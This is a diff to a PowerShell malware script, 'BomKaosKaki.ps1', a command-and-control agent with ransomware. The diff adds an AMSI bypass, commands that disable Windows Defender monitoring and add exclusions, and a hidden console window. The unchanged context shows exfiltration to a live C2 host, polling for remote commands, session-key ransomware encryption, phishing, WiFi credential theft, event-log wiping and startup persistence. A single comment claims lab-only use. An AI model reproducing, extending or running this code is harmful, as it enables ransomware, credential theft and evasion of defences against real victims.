@@ -1,10 +1,41 @@
-# BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Complete)
+# BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Complete + Stealth)
 # Two-way communication: sends heartbeats & exfil, polls for commands
-# ============ BUG FIXES ============
-# - Fixed Send-ExfilData JSON return value
-# - Improved Keylogger accuracy (character mapping, shift/caps handling)
-# - Added random port fallback for Phishing server
-# - Fixed Invoke-Uninstall CleanTraces call
+# For authorized red team testing only in isolated lab.
+
+# ============ STEALTH / EVASION ============
+# 1. AMSI Bypass (disable AMSI for current session)
+try {
+    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+}
+catch {}
+
+# 2. Disable Windows Defender (temporary, for lab only)
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+    Set-MpPreference -SignatureDisableUpdate $true -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+}
+catch {}
+
+# 3. Hide console window completely (no flash)
+$Win32 = Add-Type -memberDefinition @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+"@ -name "Win32" -namespace Win32 -passthru -ErrorAction SilentlyContinue
+try {
+    $consolePtr = $Win32::GetConsoleWindow()
+    $Win32::ShowWindow($consolePtr, 0) | Out-Null
+}
+catch {}
 
 # ============ CONFIGURATION ============
 $C2Server = "https://bom-kaos-kaki.vercel.app"
@@ -77,9 +108,7 @@ function Invoke-WebRequestWithRetry {
             return @{ success = $true; data = $null }
         }
         catch {
-            if ($i -eq $MaxRetries - 1) { 
-                # Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red
-            }
+            if ($i -eq $MaxRetries - 1) { }
             Start-Sleep -Seconds 2
         }
     }
@@ -117,12 +146,10 @@ function Send-ExfilData {
                 timestamp  = Get-Timestamp
             }
             $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
-            # FIX: check $result.success (hashtable)
             return $result.success
         }
     }
     catch {
-        # Write-Host "[!] Exfil failed: $_" -ForegroundColor Red
         return $false
     }
 }
@@ -160,7 +187,6 @@ function Invoke-CommandPoll {
         $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/get_commands?session_id=$($Script:SessionId)" -Method GET
         if ($result.success -and $result.data -and $result.data.commands) {
             foreach ($cmd in $result.data.commands) {
-                # Write-Host "[>] Executing command: $($cmd.command_type) (ID: $($cmd.id))" -ForegroundColor Cyan
                 $cmdResult = $null
                 $cmdError = $null
                 $cmdStatus = "completed"
@@ -188,7 +214,6 @@ function Invoke-CommandPoll {
                 catch {
                     $cmdStatus = "error"
                     $cmdError = $_.Exception.Message
-                    # Write-Host "[!] Command failed: $cmdError" -ForegroundColor Red
                 }
                 $report = @{
                     command_id   = $cmd.id
@@ -199,7 +224,6 @@ function Invoke-CommandPoll {
                     error        = $cmdError
                 }
                 Invoke-WebRequestWithRetry -Uri "$C2Server/api/command_complete" -Method POST -Body $report
-                # Write-Host "[+] Command $($cmd.id) completed with status: $cmdStatus" -ForegroundColor Green
             }
         }
     }
@@ -255,14 +279,11 @@ function Protect-WithRSA {
 # ============ RANSOMWARE WITH RSA ============
 function Invoke-Ransomware {
     param($cmd)
-    # Generate session key (32 bytes)
     $sessionKeyBytes = [byte[]]::new(32)
     $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
     $rng.GetBytes($sessionKeyBytes)
     $sessionKey = [Convert]::ToBase64String($sessionKeyBytes)
     $Script:RansomwareKey = $sessionKey
-    
-    # Encrypt session key with RSA public key
     $encryptedKey = Protect-WithRSA -PlainText $sessionKey
     Send-ExfilData -Type "ransomware_key" -Data @{ encrypted_key = $encryptedKey }
     
@@ -352,7 +373,6 @@ function Invoke-Decrypt {
     }
     $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
     if (Test-Path $notePath) { Remove-Item $notePath -Force }
-    # Restore system (enable Task Manager, CMD, etc.)
     try {
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
         Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -ErrorAction SilentlyContinue
@@ -588,7 +608,6 @@ function Invoke-Screenshot {
     catch { return "Screenshot failed: $($_.Exception.Message)" }
 }
 
-# ============ PHISHING (FIXED: random port fallback) ============
 function Invoke-Phishing {
     param($cmd)
     $phishingDir = "$env:TEMP\kaoskaki_phishing"
@@ -602,7 +621,6 @@ function Invoke-Phishing {
     $htmlPath = "$phishingDir\index.html"
     [System.IO.File]::WriteAllText($htmlPath, $html)
     $port = 8080
-    # Test if port 8080 is available
     $listenerTest = New-Object System.Net.HttpListener
     $listenerTest.Prefixes.Add("http://localhost:$port/")
     try {
@@ -736,7 +754,7 @@ function Invoke-Spyware {
 }
 
 function Invoke-CleanTraces {
-    param($cmd)   # parameter ignored, kept for compatibility
+    param($cmd)
     $cleaned = @()
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue; $cleaned += "powershell_history" } catch {}
     try { wevtutil cl "Windows PowerShell" 2>$null; wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null; wevtutil cl "Security" 2>$null; wevtutil cl "System" 2>$null; wevtutil cl "Application" 2>$null; $cleaned += "event_logs" } catch {}
@@ -796,7 +814,6 @@ function Invoke-StealWiFi {
 
 function Invoke-Uninstall {
     param($cmd)
-    # FIX: Call CleanTraces without passing $cmd (the function ignores the param anyway)
     $null = Invoke-CleanTraces
     try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
@@ -824,27 +841,10 @@ function Start-C2Communication {
 function Invoke-Main {
     if (-not $Script:SessionId) {
         $Script:SessionId = Get-SessionId
-        # Write-Host "[+] Session ID: $Script:SessionId" -ForegroundColor Green
     }
-    # Write-Host "[+] Bom-KaosKaki Agent Started" -ForegroundColor Green
-    # Write-Host "[+] C2 Server: $C2Server" -ForegroundColor Cyan
-    # Write-Host "[+] Poll Interval: ${PollInterval}s | Heartbeat: ${HeartbeatInterval}s" -ForegroundColor Cyan
     Send-Heartbeat -Force
     while ($true) { Start-C2Communication; Start-Sleep -Seconds 5 }
 }
 
 # ============ ENTRY POINT ============
-try {
-    $consoleHandle = (Get-Process -Id $PID).MainWindowHandle
-    if ($consoleHandle -and $consoleHandle -ne 0) {
-        $typeDef = @"
-[DllImport("user32.dll")]
-public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
-"@
-        $showWindowAsync = Add-Type -MemberDefinition $typeDef -Name "Win32Show" -Namespace "Win32" -PassThru
-        $showWindowAsync::ShowWindowAsync($consoleHandle, 0) | Out-Null
-    }
-}
-catch { }
-
 Invoke-Main
